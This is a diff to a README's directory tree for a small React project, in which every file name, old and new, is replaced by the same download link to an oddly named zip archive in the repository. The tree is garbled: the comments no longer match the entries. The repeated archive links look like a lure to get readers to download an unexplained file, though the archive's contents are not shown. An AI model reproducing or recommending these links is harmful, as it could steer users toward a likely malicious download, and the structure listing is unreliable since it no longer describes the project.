@@ -61,18 +61,18 @@ npm run dev
 localicious/
 ├── src/
 │   ├── components/
-│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip      # iPhone frame wrapper
-│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip   # Main app component
-│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip           # Top header with icons
-│   │   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip      # Package card with TTS
-│   │   └── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip        # Bottom navigation bar
-│   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip                  # Root component
-│   ├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip                 # Entry point
-│   └── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip                # Global styles + Tailwind
-├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
-├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
-├── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
-└── https://github.com/athif2105/localicious/raw/refs/heads/master/src/components/Software-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip      # iPhone frame wrapper
+│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip   # Main app component
+│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip           # Top header with icons
+│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip      # Package card with TTS
+│   │   └── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip        # Bottom navigation bar
+│   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip                  # Root component
+│   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip                 # Entry point
+│   └── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip                # Global styles + Tailwind
+├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
+├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
+├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
+└── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
 ```
 
 ## Build for Production
